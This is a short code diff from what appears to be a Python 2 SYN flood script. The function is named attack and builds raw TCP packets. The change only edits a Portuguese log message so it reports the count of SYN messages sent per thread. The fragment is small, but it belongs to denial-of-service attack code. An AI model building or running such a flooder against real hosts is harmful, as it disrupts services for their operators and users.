@@ -126,7 +126,7 @@ def attack(numero_thread):
         tcp_length = len(tcp_header)
 
         if contador > 50000:
-            print 'Foram enviados ',contador,' mensagens de SYN'
+            print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
             contador=0
         psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
         psh = psh + tcp_header;
